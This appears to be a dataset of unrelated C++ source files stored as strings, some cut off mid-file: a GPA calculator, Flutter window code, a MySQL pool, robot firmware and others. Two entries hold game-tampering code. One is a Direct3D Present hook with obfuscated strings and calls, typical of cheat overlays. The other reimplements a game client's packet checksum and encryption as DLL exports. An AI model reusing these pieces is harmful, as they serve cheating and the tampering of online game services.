    "#include <iostream>\n#include <cstdlib>\n\nusing namespace std;\n\nvoid calculateSubjectGPA();\nvoid calculateSemesterCGPA();\nvoid displayCalculationMethod();\nvoid showMainMenu();\nvoid displayJKishoreKumar();\nint main() {\n    showMainMenu();\n    return 0;\n}\n\nvoid clearScreen() {\n    cout << \"\\033[2J\\033[1;1H\";\n}\n\nvoid showMainMenu() {\n    int choice;\n    while (true) {\n        clearScreen();\n        cout << \"\\033[1;36m\";\n        cout<<\"      \"<<\"SEMESTER GRADE CALCULATION\"<< endl;\n        cout << \"\\033[0m\";\n        cout << \"******************************************************\" << endl;\n        cout << \"                   MAIN MENU\" << endl;\n        cout << \"******************************************************\" << endl;\n        cout << \"  \\033[1;32m1. Calculate Subject GPA\\033[0m\" << endl;\n        cout << \"  \\033[1;33m2. Calculate Semester CGPA\\033[0m\" << endl;\n        cout << \"  \\033[1;35m3. Display Calculation Method\\033[0m\" << endl;\n        cout << \"  \\033[1;31m4. Exit Application\\033[0m\" << endl;\n        cout << \"******************************************************\" << endl;\n        cout << \"Enter your choice (1-4): \";\n        cin >> choice;\n        \n        switch (choice) {\n            case 1:\n                calculateSubjectGPA();\n                break;\n            case 2:\n                calculateSemesterCGPA();\n                break;\n            case 3:\n                displayCalculationMethod();\n                break;\n            case 4:\n               \n                      \n                displayJKishoreKumar();\n                cout << endl;\n                cout << \"\\033[0m\";\n                exit(EXIT_SUCCESS);\n            default:\n                cout << \"\\033[1;31m\";\n                cout << \"Invalid input. Please enter a number between 1 and 4.\" << endl;\n                cout << \"\\033[0m\";\n                cout << \"Press Enter to continue...\";\n                cin.ignore();\n                cin.get();\n        }\n    }\n}\n\nvoid calculateSubjectGPA() {\n    clearScreen();\n    int numSubjects;\n    cout << \"******************************************************\" << endl;\n    cout << \"            \\033[1;32mCalculate Subject GPA\\033[0m                     \" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"Enter the number of subjects: \";\n    cin >> numSubjects;\n\n    float credits[numSubjects];\n    float points[numSubjects];\n\n    float totalPoints = 0, totalCredits = 0;\n\n    for (int i = 0; i < numSubjects; ++i) {\n        cout << \"Subject \" << i + 1 << \":\" << endl;\n        cout << \"  - Enter credit: \";\n        cin >> credits[i];\n        cout << \"  - Enter point: \";\n        cin >> points[i];\n        totalPoints += credits[i] * points[i];\n        totalCredits += credits[i];\n    }\n\n    cout << \"******************************************************\" << endl;\n    cout << \"Total GPA: \" << (totalPoints / totalCredits) << endl;\n    cout << \"Press Enter to continue...\";\n    cin.ignore();\n    cin.get();\n}\n\nvoid calculateSemesterCGPA() {\n    clearScreen();\n    int numSemesters;\n    cout << \"******************************************************\" << endl;\n    cout << \"          \\033[1;33mCalculate Semester CGPA\\033[0m                     \" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"Enter the number of semesters: \";\n    cin >> numSemesters;\n\n    float semesterGPA[numSemesters];\n    float totalGPA = 0;\n    float totalGradingPoints = 0;\n\n    for (int i = 0; i < numSemesters; ++i) {\n        cout << \"Semester \" << i + 1 << \":\" << endl;\n        cout << \"  - Enter GPA: \";\n        cin >> semesterGPA[i];\n        cout << \"  - Enter total grading points: \";\n        float Points;\n        cin >> Points;\n        totalGradingPoints+=Points;\n        totalGPA += (semesterGPA[i]*Points);\n    }\n\n    cout << \"******************************************************\" << endl;\n    cout << \"CGPA: \" << (totalGPA / totalGradingPoints) << endl;\n    cout << \"Press Enter to continue...\";\n    cin.ignore();\n    cin.get();\n}\n\nvoid displayCalculationMethod() {\n    clearScreen();\n    cout << \"******************************************************\" << endl;\n    cout << \"          \\033[1;35mMethod of Calculating GPA & CGPA\\033[0m            \" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"GPA = Sum of (Credit * Point) / Total Credits\" << endl;\n    cout << \"CGPA = Sum of (GPA * Total Grading Points) / Sum of Total Grading Points\" << endl;\n    cout << \"******************************************************\" << endl;\n    cout << \"Press Enter to continue...\";\n    cin.ignore();\n    cin.get();\n}\n\nvoid displayJKishoreKumar() {\n    clearScreen();\n  cout << \"Thank you for using the GPA & CGPA Calculator. Goodbye!\" << endl;\n                cout << \"\\033[1;33m\";\n                cout << \"Done by \";\n    cout << \"\\033[1;31mJ\";\n    cout << \"\\033[1;33m.\";\n    cout << \"\\033[1;32mK\";\n    cout << \"\\033[1;34mI\";\n   ",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nclass Book {\npublic:\n    string title;\n    string author;\n\n    Book(string t, string a)\n    {\n        title = t;\n        author = a;\n    }\n};\n\nclass Library {\nprivate:\n    static const int Max_Books = 100;\n    Book* books[Max_Books];\n    int num_books;\n\npublic:\n    Library()\n    {\n        num_books = 0;\n   \n    }\n\n    void add_book(Book* book) {\n        if (num_books < Max_Books) {\n            books[num_books++] = book;\n        }\n        else {\n            cout << \"Library is full!\" << endl;\n        }\n    }\n\n    void remove_book(Book* book) {\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i] == book) {\n             \n                books[i] = books[num_books - 1];\n                num_books--;\n                cout << \"Book removed from the library.\" << endl;\n                return;\n            }\n        }\n        cout << \"Book not found in the library.\" << endl;\n    }\n\n    void search_by_title(string title) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->title == title) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"No books found with the given title.\" << endl;\n        }\n    }\n\n    void search_by_author(string author) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->author == author) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"This Author has not written any book.\" << endl;\n        }\n    }\n  \n};\n\nint main() {\n    Library library;\n\n    Book book1(\"Object Oriented Programming\", \"Tonny Gaddis\");\n    Book book2(\"C++ by Me\", \"Mr Abdullah\");\n\n    library.add_book(&book1);\n    library.add_book(&book2);\n\n    cout << \"Books by title:\" << endl;\n    library.search_by_title(\"Object Oriented Programming\");\n\n    cout << \"\\nBooks by author:\" << endl;\n    library.search_by_author(\"Mr Abdullah\");\n\n    cout << \"\\nRemoving a book...\" << endl;\n    library.remove_book(&book1);\n\n    return 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"SqlConnPool.h\"\n\nSqlConnPool* SqlConnPool::Instance() {\n    static SqlConnPool connPool;\n    return &connPool;\n}\n\nvoid SqlConnPool::Init(const char* host, int port, const char* user,\n                       const char* pwd, const char* dbName, int connSize) {\n    assert(connSize > 0);\n    for (int i = 0; i < connSize; ++i) {\n        MYSQL* conn = nullptr;\n        conn = mysql_init(conn);\n\n        if (!conn) {\n            LOG_ERROR(\"mysql_init error!\");\n            assert(conn);\n        }\n\n        conn = mysql_real_connect(conn, host, user, pwd, dbName, port, nullptr, 0);\n        if (!conn) {\n            LOG_ERROR(\"mysql_real_connect error!\");\n        }\n        connQue_.emplace(conn);\n    }\n    MAX_CONN_ = connSize;\n    sem_init(&semId_, 0, MAX_CONN_);\n}\n\nMYSQL* SqlConnPool::GetConn() {\n    MYSQL* conn = nullptr;\n    if (connQue_.empty()) {\n        LOG_WARN(\"SqlConnPool busy!\");\n        return nullptr;\n    }\n    sem_wait(&semId_);\n    {\n        std::lock_guard<std::mutex> locker(mtx_);\n        conn = connQue_.front();\n        connQue_.pop();\n    }\n    return conn;\n}\n\n// \u5c06\u6570\u636e\u5e93\u8fde\u63a5\u5f52\u8fd8\u5230\u8fde\u63a5\u6c60\nvoid SqlConnPool::FreeConn(MYSQL* conn) {\n    assert(conn);\n    std::lock_guard<std::mutex> locker(mtx_);\n    connQue_.emplace(conn);\n    sem_post(&semId_);\n}\n\nvoid SqlConnPool::ClosePool() {\n    std::lock_guard<std::mutex> locker(mtx_);\n    while (!connQue_.empty()) {\n        auto conn = connQue_.front();\n        connQue_.pop();\n        mysql_close(conn);\n    }\n    mysql_library_end();        // \u91ca\u653e\u6574\u4e2a MySQL \u5ba2\u6237\u7aef\u5e93\u7684\u8d44\u6e90\n}\n\nint SqlConnPool::GetFreeConnCount() {\n    std::lock_guard<std::mutex> locker(mtx_);\n    return connQue_.size();\n}",
    "#include <Arduino.h>\n#include <SPI.h>\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n#include <PID_v1.h>\n#include <SoftwareSerial.h>\n  SoftwareSerial arduinoSerial = SoftwareSerial(10, 11);//RX TX || PB4 PB5\n#include <Servo.h>\n\nunsigned long time;\n\n//FaBoPWM faboPWM;\nint pos = 0;\nint MAX_VALUE = 2000;\nint MIN_VALUE = 300;\n\n#define SERIAL  Serial\n#define BTSERIAL Serial3\n\n#define LOG_DEBUG\n\n#ifdef LOG_DEBUG\n  #define M_LOG SERIAL.print\n#else\n  #define M_LOG BTSERIAL.println\n#endif\n\n////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////\n/*\n  BELOW BY GROUP C4-C\n*/\n\n// enum class for states with different function executions\nenum class Mode {\n   //Wifi communication enum class Mode {\n  WIFI_MANUAL, //Wifi communication \n  NORMAL, // Obstacle avoidance + Line tracking + Tennis ball detection + Wifi communication\n  OBSTACLE_DETECTED, // -line tracking, when obstacle detected\n  TENNIS_DETECTED, // -obstacle avoidance, when tennis ball detected but not catched\n  CATCHING, // +Tennis ball catch, -obstacle avoidance, -line tracking, when catching tennis ball\n  CATCHED // +Tennis ball catch, when tennis ball catched by arm\n} Mode, Last_Mode;\n\nenum class WIFIMODE {\n  NONE,\n  M1,\n  M2,\n  M3,\n  M4  \n} WifiMode;\n\n//infrared sensors ||left:out-gnd-vcc:right||\n#define INFRARED1 25 //front left PA3\n#define INFRARED2 28 //front right PA6\n#define INFRARED3 29 //left PA7\n#define INFRARED4 30 //right PC7\n#define INFRARED5 32 //back PC5\nint Infrared_front_left, Infrared_front_right;\nint Infrared_left, Infrared_right, Infrared_back;\nint Infrared_combined = 0b0000;\n\n\n//grayscale sensors\n#define GRAYSCALE1 A3 //left most PF1\n#define GRAYSCALE2 A2 //left second PF2\n#define GRAYSCALE3 A6 //middle PF3\n#define GRAYSCALE4 A7 //right second PF4\n#define GRAYSCALE5 A8 //right most PF5\ndouble Grayscale_middle_left, Grayscale_middle_right;\ndouble Grayscale_middle;\ndouble Grayscale_left, Grayscale_right;\nint Grayscale_combined = 0b00000;\n\n\n//ultrasonic sensors\n#define SONAR_TRIG 48 //PA7\n#define SONAR_ECHO 47 //PA6\ndouble Sonar_distance_in_cm;\nint done, start_time;\n\n//flags to determine whether other functions should be executed\nbool Obstacle_flag = false;\nbool Front_flag = false;\nbool Left_flag = false;\nbool Right_flag = false;\nint retrieve_flag = 0; // 0: no retrieve, 1: front obstacle, 2: avoid obstacle, 3: conduct go left, 4:conduct go right\nint front_cnt = 0, left_cnt = 0, right_cnt = 0;\n\n// bool Line_flag = false;\nbool Rotate_flag = false; // whether continue rotation\nint rotate_cnt = 0;\nbool Tennis_flag = false;\nbool Catching_flag = false;\nbool Catched_flag = false;\nbool Arm_flag = false;\nint Arm_cnt = 0;\n\n// back to line\nint last_time = 0, shift_stop_time = 0;\nfloat last_avoid_move_x = 0.0;\nfloat last_avoid_move_y = 0.0;\nfloat last_avoid_move_z = 0.0;\n\n\n#define Wheel_Radius 0.04 //m\n#define MOTOR_KP 0.6\n#define MOTOR_KI 0.0\n#define MOTOR_KD 0.0\n#define CLIP(x, min, max) if (x < min) x = min; if (x > max) x = max;\n#define LOW_SPEED 0.4\n#define MEDIUM_SPEED 0.6\n#define HIGH_SPEED 0.8\ndouble all_speed_set = LOW_SPEED;\n\n//WIFI\nString  message = \"\";\n\n//Vision\nString vision_message = \"\";\n\n//Servo motor\n#define PitchPin  4 // PG5 \n#define YawPin 13 // PB7\n#define ArmPin1 46 //PL3\n#define ArmPin2 45 //PL4\nServo PitchServo; // 10-150\nServo YawServo; // 0-180\nServo ArmServo1; // 0-180\nServo ArmServo2; // 0-180\nint angle;\n\nclass DCMotor {\n  private:\n      int pwmPin; // PWM pin for motor speed control\n      int dirAPin;\n      int dirBPin;\n\n  public:\n      int encoderAPin;\n      int encoderBPin;\n      double ecd; // Encoder value\n      double last_ecd;\n      double speed;\n      double speed_set;\n      double pwm;\n      double pwm_set;\n      String wifi_cmd;\n\n      DCMotor(int pwm, int dirA, int dirB, int encoderA, int encoderB);\n      void setMotor(int analogSpeed);\n      void setSpeed(int analogSpeed);\n      void setDirection(int dir);\n      void encoderSubroutineA();\n      void encoderSubroutineB();\n};\n\nclass Chassis_control_t {\n  private:\n\n  public:\n    double vx, vy, wz;\n    String wifi_cmd;\n    int move_cnt;\n    int move_flag;\n    int target_dir;\n\n} Chassis_control;\n\nclass Gimbal_control_t {\n  private:\n\n  public:\n    int pitch, yaw;\n    int cnt;\n    int scan_cnt;\n    int scan_flag;\n    int target;\n    int target_flag; // 0: no target, 1: target detected \n\n} Gimbal_control;\n\nclass Vision_t {\n  private:\n\n  public:\n    int yaw_dir;\n    int target_flag;\n    int catch_flag;\n\n} Vision;\n\nconst double EPRA = 660;\nconst double EPRB = 660;\nconst double EPRC = 660;\nconst double EPRD = 660;\n\nconst int pwmPin1 = 12; const int dir1A = 34; const int dir1B = 35; const int encoder1A = 18; const int encoder1B = 31; // A M1\nconst int pwmPin2 = 8; const int dir2A = 37; const int dir2B = 36; const int encoder2A = 19; const int ",
    "//By AlSch092 @ Github\r\n#include \"imcCrypt.hpp\"\r\n\r\nunsigned short __declspec(naked) imcCrypt::MakeChecksum(LPBYTE outBuffer, const UINT uiSize)\r\n{\r\n\t__asm\r\n\t{\r\n\t\t\tpush ebp\r\n\t\t\tmov ebp, esp\r\n\t\t\tpush edi\r\n\t\t\tmov edi, [ebp + 0x08]\r\n\t\t\txor edx, edx\r\n\t\t\ttest edi, edi\r\n\t\t\tjne case7\r\n\t\t\txor eax, eax\r\n\t\t\tjmp case6\r\n\tcase7:\r\n\t\t\tpush esi\r\n\t\t\tmov esi, edx\r\n\t\t\tcmp[ebp + 0x0C], edx\r\n\t\t\tjle case5\r\n\tcase1:\r\n\t\t\tmov eax, esi\r\n\t\t\tand eax, 0x80000001\r\n\t\t\tjns case4\r\n\t\t\tdec eax\r\n\t\t\tor eax, -02\r\n\t\t\tinc eax\r\n\tcase4:\r\n\t\t\tje case3\r\n\t\t\tmovzx eax, byte ptr[esi + edi]\r\n\t\t\tadd edx, eax\r\n\t\t\tjmp case2\r\n\tcase3:\r\n\t\t\tmovzx ecx, byte ptr[esi + edi]\r\n\t\t\txor edx, ecx\r\n\tcase2:\r\n\t\t\tinc esi\r\n\t\t\tcmp esi, [ebp + 0x0C]\r\n\t\t\tjl case1\r\n\tcase5:\r\n\t\t\tmov eax, edx\r\n\t\t\tpop esi\r\n\tcase6:\r\n\t\t\tpop edi\r\n\t\t\tpop ebp\r\n\t\t\tret\r\n\t}\r\n}\r\n\r\nextern \"C\" int __declspec(dllexport) AddChecksumToPacket(LPBYTE outBuffer, const UINT uiSize)\r\n{\r\n\tunsigned short checksum = imcCrypt::MakeChecksum(outBuffer, uiSize);\r\n\tmemcpy((void*)(outBuffer + 6), (void*)&checksum, 2);\r\n\treturn checksum;\r\n}\r\n\r\nextern \"C\" int __declspec(dllexport) Encrypt(LPBYTE pBuf, LPBYTE outBuffer , const UINT uiSize)\r\n{\r\n\treturn imcCrypt::Encrypt(pBuf, outBuffer, uiSize, imcCrypt::key); //(imcCrypt::bf_key_st*)0x00F83BD8\t\r\n}\r\n\r\nint __declspec(naked) imcCrypt::GetNumBlock(const int dataLen) //convert back to c when test done\r\n{\r\n\t__asm\r\n\t{\r\n\t\tpush ebp\r\n\t\tmov ebp, esp\r\n\t\tpush esi\r\n\t\tmov esi, [ebp + 0x08]\r\n\t\tmov eax, esi\r\n\t\tcdq\r\n\t\tand edx, 0x07\r\n\t\tadd eax, edx\r\n\t\tsar eax, 0x03\r\n\t\tmov ecx, eax\r\n\t\tshl ecx, 0x03\r\n\t\tsub esi, ecx\r\n\t\ttest esi, esi\r\n\t\tpop esi\r\n\t\tjle jmp1\r\n\t\tinc eax\r\n\tjmp1:\r\n\t\tpop ebp\r\n\t\tret\r\n\r\n\t}\r\n}\r\n\r\nvoid __declspec(naked) _memcpy(const unsigned __int8 *pDataIn, unsigned __int8 *pDataOut, const int dataLen) //preserve the stack\r\n{\r\n\tmemcpy((void*)pDataOut, pDataIn, dataLen);\r\n\r\n\t__asm\r\n\t{\r\n\t\tret\r\n\t}\r\n}\r\n\r\nUINT16 __declspec(naked) imcCrypt::_BF_encrypt(LPVOID inBuffer, LPVOID key) //2 arguments\r\n{\r\n\t__asm\r\n\t{\r\n\t\t\tpush ebp\r\n\t\t\tpush ebx\r\n\t\t\tmov ebx, [esp + 0x0C]\r\n\t\t\tmov ebp, [esp + 0x10]\r\n\t\t\tpush esi\r\n\t\t\tpush edi\r\n\t\t\tmov edi, [ebx]\r\n\t\t\tmov esi, [ebx + 0x04]\r\n\t\t\txor eax, eax\r\n\t\t\tmov ebx, [ebp + 0x00]\r\n\t\t\txor ecx, ecx\r\n\t\t\txor edi, ebx\r\n\t\t\tmov edx, [ebp + 0x04]\r\n\t\t\tmov ebx, edi\r\n\t\t\txor esi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, edi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x00000848]\r\n\t\t\txor ebx, eax\r\n\t\t\tmov edx, [ebp + edx * 4 + 0x00000C48]\r\n\t\t\tadd ebx, edx\r\n\t\t\txor eax, eax\r\n\t\t\txor esi, ebx\r\n\t\t\tmov edx, [ebp + 0x08]\r\n\t\t\tmov ebx, esi\r\n\t\t\txor edi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, esi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x00000848]\r\n\t\t\txor ebx, eax\r\n\t\t\tmov edx, [ebp + edx * 4 + 0x00000C48]\r\n\t\t\tadd ebx, edx\r\n\t\t\txor eax, eax\r\n\t\t\txor edi, ebx\r\n\t\t\tmov edx, [ebp + 0x0C]\r\n\t\t\tmov ebx, edi\r\n\t\t\txor esi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, edi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x00000848]\r\n\t\t\txor ebx, eax\r\n\t\t\tmov edx, [ebp + edx * 4 + 0x00000C48]\r\n\t\t\tadd ebx, edx\r\n\t\t\txor eax, eax\r\n\t\t\txor esi, ebx\r\n\t\t\tmov edx, [ebp + 0x10]\r\n\t\t\tmov ebx, esi\r\n\t\t\txor edi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, esi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x00000848]\r\n\t\t\txor ebx, eax\r\n\t\t\tmov edx, [ebp + edx * 4 + 0x00000C48]\r\n\t\t\tadd ebx, edx\r\n\t\t\txor eax, eax\r\n\t\t\txor edi, ebx\r\n\t\t\tmov edx, [ebp + 0x14]\r\n\t\t\tmov ebx, 